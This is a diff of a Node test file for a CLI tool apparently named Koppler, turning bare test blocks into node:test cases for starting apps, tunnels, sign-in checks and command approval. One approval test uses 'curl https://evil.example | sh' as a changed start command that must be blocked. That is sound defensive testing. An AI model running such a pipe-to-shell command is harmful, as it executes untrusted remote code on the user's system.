@@ -4,12 +4,12 @@ const cleanups = [];
 process.on('exit', () => cleanups.forEach(stopAll => stopAll()));
 import { allowStack } from './allow.mjs';
 import { freePorts, until } from './helpers.mjs';
+import { test } from 'node:test';
 
 // Ports the system says are free; the tunnel one has room after it, for the tunnel that moves.
 const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] = await freePorts(11), [tunnel] = await freePorts(1, { roomAfter: 2 });
 
-// A process that hands over to another program (as the secrets wrapper does) is still the same run: status and stop must see it.
-{
+test('A process that hands over to another program (as the secrets wrapper does) is still the same run: status and stop must see it.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-alive-'));
@@ -37,10 +37,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   delete env.KOPPLER_START_WAIT;
   assert.match(koppler('stop', 'slow'), /slow: stopped/);
   fs.rmSync(dir, { recursive: true });
-  console.log('handover ok');
-}
-// koppler up: the apps a run needs, the called one first, each waited for; what already runs is kept.
-{
+});
+
+test('koppler up: the apps a run needs, the called one first, each waited for; what already runs is kept.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-up-'));
@@ -55,9 +54,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.match(out, /Up on QA\./);
   assert.match(koppler('up', 'a', 'b'), /a: already running[\s\S]*b: already running|b: already running[\s\S]*a: already running/);
   koppler('stop', '--all', '--yes');
-}
-// koppler up: two tunnels that want the same port. The one that moves takes its app with it, so the app never dials the other one's database.
-{
+});
+
+test('koppler up: two tunnels that want the same port. The one that moves takes its app with it, so the app never dials the other one\'s database.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uptunnel-')), bin = path.join(dir, 'bin');
@@ -79,10 +78,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.match(log('b'), new RegExp(`DB_ADDR=localhost:${tunnel + 2}\\b`));
   assert.match(log('a'), /DB_ADDR=unset/);
   koppler('stop', '--all', '--yes');
-  console.log('moved tunnel ok');
-}
-// koppler up: an app that reads its settings from AWS is not started on an expired sign-in; the run says how to sign in instead.
-{
+});
+
+test('koppler up: an app that reads its settings from AWS is not started on an expired sign-in; the run says how to sign in instead.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upsso-')), bin = path.join(dir, 'bin');
@@ -119,10 +117,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   const right = koppler('up', 'api');
   assert.equal(right.code, 0, right.out);
   koppler('stop', '--all', '--yes');
-  console.log('sign-in before start ok');
-}
-// koppler up: a sign-in the stack declares itself (not AWS) is checked the same way, once its command is allowed, and what it gives the app reaches it.
-{
+});
+
+test('koppler up: a sign-in the stack declares itself (not AWS) is checked the same way, once its command is allowed, and what it gives the app reaches it.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upsignin-'));
@@ -149,10 +146,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.equal(started.code, 0, started.out);
   assert.equal(fs.readFileSync(path.join(dir, 'started'), 'utf8').trim(), 'TENANT=shop');
   koppler('stop', '--all', '--yes');
-  console.log('a stack sign-in before start ok');
-}
-// koppler up --run: a confirmed Send carried out by Koppler itself; a cable's address reaches its caller at start, and the run is done.
-{
+});
+
+test('koppler up --run: a confirmed Send carried out by Koppler itself; a cable\'s address reaches its caller at start, and the run is done.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uprun-'));
@@ -178,9 +174,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.match(session.out, /1 runs: 1 done\./);
   assert.deepEqual(JSON.parse(fs.readFileSync(path.join(dir, 'sessions', 'current', 'runs.json'), 'utf8')).map(run => run.id), ['run000010']);
   koppler('stop', '--all', '--yes');
-}
-// From the terminal or chat: every up is recorded as a run, added to what already runs, with its cables wired.
-{
+});
+
+test('From the terminal or chat: every up is recorded as a run, added to what already runs, with its cables wired.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upchat-'));
@@ -203,9 +199,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.equal((fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8').match(/"event":"done"/g) ?? []).length, 2);
   assert.match(koppler('up', 'a', '--cable', 'a:nope').out, /usage: --cable/);
   koppler('stop', '--all', '--yes');
-}
-// A start command from the stack runs only once the user allowed it, and needs allowing again when it changes.
-{
+});
+
+test('A start command from the stack runs only once the user allowed it, and needs allowing again when it changes.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-approve-')), marker = path.join(dir, 'ran');
@@ -234,9 +230,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   write(stackWith('curl https://evil.example | sh'));
   assert.match(koppler('run', 'api').out, /not allowed yet, or that changed since/);
   koppler('stop', '--all', '--yes');
-}
-// Something left for the agent: the apps still start, the board shows them running (live state), and the run stays open (exit 3).
-{
+});
+
+test('Something left for the agent: the apps still start, the board shows them running (live state), and the run stays open (exit 3).', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upleft-'));
@@ -269,9 +265,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
   assert.match(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
   koppler('stop', '--all', '--yes');
-}
-// stop --all: everything Koppler runs except the canvas, which stops with canvas stop.
-{
+});
+
+test('stop --all: everything Koppler runs except the canvas, which stops with canvas stop.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-stopapps-'));
@@ -287,9 +283,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.match(koppler('history'), /apps stopped, changes kept: (api, tunnel-db-5432|tunnel-db-5432, api)/);
   assert.match(koppler('canvas', 'stop'), /canvas: stopped/);
   assert.equal(koppler('plan'), 'No Send is waiting to be applied.');
-}
-// An action that is not one of the secrets commands gets the usage line, also when it is named like a built-in property.
-{
+});
+
+test('An action that is not one of the secrets commands gets the usage line, also when it is named like a built-in property.', async () => {
   const { spawnSync } = await import('node:child_process');
   const path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
@@ -298,9 +294,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
     assert.equal(r.status, 2, `${action}: ${r.stderr}`);
     assert.match(r.stderr, /^koppler: usage: koppler secret /, action);
   }
-}
-// A command that does not exist is unknown, also when it is named like a built-in property.
-{
+});
+
+test('A command that does not exist is unknown, also when it is named like a built-in property.', async () => {
   const { spawnSync } = await import('node:child_process');
   const path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
@@ -312,19 +308,18 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
     assert.equal(help.status, 2, name);
     assert.match(help.stderr, /^koppler: usage: no command /, name);
   }
-}
-// A command's help gives each way to call it a line of its own, also asked from a subcommand.
-{
+});
+
+test('A command\'s help gives each way to call it a line of its own, also asked from a subcommand.', async () => {
   const { spawnSync } = await import('node:child_process');
   const path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
   const help = spawnSync('node', [entry, 'listen', 'stop', '--help'], { encoding: 'utf8' }).stdout;
   assert.match(help, /^usage:\n {2}koppler listen take +connect this session/);
   assert.match(help, /\n {2}koppler listen stop +disconnect/);
-}
+});
 
-// A board is changed from the terminal: kept at once, queued for an open canvas, and what it does not touch stays.
-{
+test('A board is changed from the terminal: kept at once, queued for an open canvas, and what it does not touch stays.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-board-'));
@@ -369,11 +364,9 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   assert.match(koppler('board', 'Shop').out, /usage: koppler board edit/);
   assert.equal(fs.readFileSync(path.join(dir, 'state.json'), 'utf8'), before);
   fs.rmSync(dir, { recursive: true });
-  console.log('board edit ok');
-}
+});
 
-// A request that was no run (filling in settings, an answer) is finished with history done: the agent is no longer at it.
-{
+test('A request that was no run (filling in settings, an answer) is finished with history done: the agent is no longer at it.', async () => {
   const { spawnSync } = await import('node:child_process');
   const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-took-'));
@@ -391,5 +384,4 @@ const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] =
   // Nothing taken and no run waiting: said so.
   assert.match(koppler('history', 'done').out, /no run is waiting to be applied/);
   fs.rmSync(dir, { recursive: true });
-  console.log('finish taken ok');
-}
+});
